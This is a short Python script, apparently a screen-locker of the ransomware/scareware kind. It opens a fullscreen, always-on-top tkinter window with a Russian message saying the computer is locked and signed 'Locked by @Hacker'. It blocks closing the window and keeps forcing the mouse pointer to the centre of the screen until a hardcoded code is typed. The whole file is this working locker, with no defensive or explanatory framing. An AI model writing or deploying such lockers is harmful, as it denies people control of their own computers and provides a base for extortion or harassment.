############	Imports    ############
import sys
from datetime import datetime
from tkinter import *
from pyautogui import click, moveTo
############	Imports    ############


############	Variables	############
run = True
key = "1543"
############	Variables	############


############	Create window	############
root = Tk()
root.title("Locker")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
############	Create window	############


############	Functions	############
def on_closing():
	global run
	try:
		if codeEntry.get() == key:
			run = False
		root.attributes("-fullscreen", True)
		root.attributes("-topmost", True)
		root.protocol("WM_DELETE_WINDOW", on_closing)
		moveTo(root.winfo_screenwidth() // 2, root.winfo_screenheight() // 2)
		click(root.winfo_screenwidth() // 2, root.winfo_screenheight() // 2)
		codeEntry.focus()
		timeL['text'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
		timeL.pack(side = BOTTOM, anchor = SE)
		root.update()
	except Exception as e:
		print(e)
		
############	Functions	############

	
############	Items	############
# Labels
titleL = Label(root, text = "Компьютер заблокирован \n введите код и нажмите пробел:", font= ("Arial", 70, "bold")).pack(pady = 100)
lockL = Label(root, text = "Locked by @Hacker", font = ("Arial", 24, "italic")).pack(side = BOTTOM, anchor = SW)
timeL = Label(root, text = datetime.now().strftime("%Y-%m-%d %H:%M:%S"), font = ("Arial", 24))
timeL.pack(side = BOTTOM, anchor = SE)

# Entry
codeEntry = Entry(root, font = ("Arial", 50, "italic"))
codeEntry.pack(pady = 25)
############	Items	############


############	Mainloop    ############
while run:
	on_closing()
############	Mainloop    ############


############	Exit    ############
root.destroy()
############	Exit	############